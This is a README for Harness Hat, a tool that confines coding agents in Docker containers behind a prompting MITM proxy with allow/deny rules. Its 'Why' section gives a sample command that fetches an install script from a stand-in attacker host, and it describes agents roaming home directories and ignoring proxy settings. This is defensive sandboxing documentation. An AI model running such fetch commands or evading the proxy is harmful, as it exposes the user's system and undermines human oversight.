# Harness Hat

> Docker-backed development sessions with proxy-mediated network policy — driven from a terminal UI.

Harness Hat (`hh`) is a session manager for running coding agents and dev workflows inside disposable, network-filtered Docker containers. You register a workspace, pick a language template, and get an interactive shell in a sandbox whose every outbound TCP packet is steered through a MITM HTTP/HTTPS proxy governed by a per-workspace allow/deny list.

It's the harness; your container is the hat.

## Why

Modern coding agents (`claude`, `codex`, `gemini`, `pi`, …) want to read your home directory, install random packages, hit unknown endpoints, and execute arbitrary shell. Giving them an unrestricted shell on your laptop is a bad time.

Harness Hat boxes each session in a container with:

- A real shell, real toolchains, your repo bind-mounted at `/workspace`.
- A scoped HTTPS proxy that **prompts before allowing unknown hosts**, persists your decisions to a committed `harness-rules.toml`, and refuses anything denied.
- **Strict-network mode**: `tun2proxy` + `iptables` capture *all* outbound TCP, so agents can't bypass the proxy by ignoring `HTTPS_PROXY`.
- Per-session seeded mounts for `~/.claude.json`-style files that agents rewrite in place, so two concurrent sessions can't corrupt each other.
- A bundled MITM CA wired into Node, Python, Go, Ruby, curl, OpenSSL, gRPC, Java (via init keytool), and the system trust store.

If an agent wants to `curl evil.example.com/install.sh`, it asks first. You see the request. You decide.

## Quick start

```sh
cargo install harness-hat              # binary is `hh`
hh  # will prompt you to create config, or launch the manager if config exists
```

Inside the TUI: pick a workspace, pick a template, get a shell. From inside the container, run `killme` to ask Harness Hat to stop the session.

To attach to an already-running session from a separate terminal:

```sh
hh shell           # lists running sessions
hh shell <ID>      # attaches via `docker exec -it`
```

## Model

```
 workspace  ─┐
             ├── session  ──>  one running container
 template   ─┘
```

- **Workspace** — a fixed host directory (your repo), mounted into the container at `/workspace`.
- **Template** — a `[container_profiles.<name>]` block referencing a Dockerfile stem under `docker_dir`. Sets memory, CPU, mounts, env, starter network allowlist.
- **Session** — one container, one shell, one network policy. Stop it from the TUI or by running `killme` inside it.

## Built-in templates

The base image is Ubuntu 24.04 with Node 22 and the Claude Code apt package. Stacked on top:

| Stem         | Toolchain                                                          |
|--------------|--------------------------------------------------------------------|
| `default`    | Node, pnpm, TypeScript, `tsx`, Bun                                 |
| `typescript` | TypeScript, Bun, npm, Node, pnpm, Vite, ESLint, Prettier           |
| `go`         | Go, `gopls`, Delve, `staticcheck`, `golangci-lint`                 |
| `rust`       | Rust stable + rustfmt, clippy, rust-analyzer, nextest, audit, deny |
| `php`        | PHP CLI/dev, Composer, PHPUnit, PHP-CS-Fixer, PHPStan, Pint, Xdebug, PCOV |

Drop your own `something.dockerfile` under `docker_dir` and reference it as `image = "something"`.

## Network policy

Each workspace can commit a `harness-rules.toml` next to its source — Harness Hat reads it on session start and persists any "Allow forever" / "Deny forever" approvals from the TUI back into it.

```toml
version = 1

[network]
allowlist = [
  "method=GET,POST domain=api.github.com path=/repos/* port=443",
  "domain=registry.npmjs.org",
  "domain=*.crates.io",
]
denylist = [
  "domain=*.evil.example",
]
```

- **Deny wins** over allow.
- **Unknown** requests prompt in the TUI (Allow once / Deny once / Allow forever / Deny forever).
- Domain rules support exact (`example.com`) and subdomain-only wildcards (`*.example.com`).
- Path rules support exact and `*` wildcards; query strings are stripped, percent-decoded, `..`/`//` collapsed before match.
- Hostnames are canonicalized (lowercase, trailing-dot strip, IDNA) before rule matching — case, trailing dots, and punycode can't bypass denies.

Bypass the MITM entirely for specific hosts (e.g., agent API endpoints with strict cert pinning) via `[defaults.containers].bypass_proxy` or per-template `bypass_proxy`.

## Strict-network mode

Enabled by default in the example config. When on:

1. `tun2proxy` runs inside the container and captures **all** TCP via a TUN device.
2. `iptables` rejects every outbound packet that isn't loopback, Docker DNS, the scoped proxy, the control server, or an explicit `localhost_forwards` target.
3. UDP/QUIC are blocked (except DNS to Docker's embedded resolver).
4. IPv6 is rejected wholesale to prevent AAAA/QUIC hangs.

The result: an application that "doesn't honor `HTTPS_PROXY`" still gets its packets steered through the proxy or dropped. There is no escape hatch.

Requires `/dev/net/tun` — Docker Desktop usually needs the container started privileged. Harness Hat handles that.

## Security posture

- Bearer-token and proxy-auth comparisons use constant-time equality.
- HTTP parsing rejects `Content-Length` + `Transfer-Encoding` conflicts, duplicate `Content-Length`, bare-LF terminators, obs-fold continuations, and trailing body bytes.
- TLS MITM leaf-cert cache is bounded (LRU 1024) with key generation off the async runtime; concurrent first-misses are de-duplicated.
- CONNECT MITM replays pipelined bytes into the TLS acceptor.
- SNI/CONNECT hosts are validated before becoming cache keys or cert subjects.
- IPv6 SSRF predicate covers NAT64, 6to4, IPv4-translated, and discard-only prefixes.
- Audit log and `log_dir` are created `0o600`/`0o700` atomically and refuse to follow symlinks.
- Control server and proxy default to loopback-only; non-loopback binds require explicit `allow_remote_control = true`.
- Workspace paths under `~/.ssh`, `~/.gnupg`, `/etc` are refused.
- Mount/container paths reject `:` and `,` to prevent `-v` argument injection.

## Configuration overview

```toml
version = 1
docker_dir = "/Users/you/.config/harness-hat/docker"

[manager]
global_rules_file = "~/.config/harness-hat/harness-rules.toml"

[defaults.control]                       # killme + session identity
server_port = 7878
server_host = "127.0.0.1"
token_env_var = "HARNESS_HAT_TOKEN"

[defaults.proxy]
proxy_port = 28781
proxy_host = "127.0.0.1"
strict_network = true

[defaults.containers]
env_passthrough = ["TERM", "COLORTERM"]
bypass_proxy = ["api.anthropic.com", "claude.ai", "..."]

[[defaults.containers.mounts]]           # shared across all templates
host = "~/.claude.json"
container = "/home/coder/.claude.json"
mode = "rw"
seed = true                              # per-session copy, not a live bind

[[defaults.containers.mounts]]
host = "~/.claude/.claude.json"
container = "/home/coder/.claude/.claude.json"
mode = "rw"
seed = true

[container_profiles.rust]
image = "rust"
memory = "6g"
cpus = "3"
starter_network_allowlist = [
  "domain=crates.io",
  "domain=*.crates.io",
  "domain=github.com",
]

[[workspaces]]
name = "my-project"
canonical_path = "~/src/my-project"
```

Full example: [`harness-hat.example.toml`](harness-hat.example.toml).

## CLI

```
hh                       # launch interactive workspace manager (default)
hh --config PATH         # use a specific config
hh init [PATH]           # write a starter config (default: ./harness-hat.toml)
hh shell                 # list running sessions
hh shell <ID>            # docker exec into a running session
```

## Status

Harness Hat is pre-1.0 and the config schema is still iterating — see [`CHANGELOG.md`](CHANGELOG.md) for the breaking-change log. The 0.8.0 line is a major rewrite around the workspace+template+shell model; the previous `hostdo`/`agentctl` host-command bridges are gone.

## License

MIT — see [`LICENSE`](LICENSE).
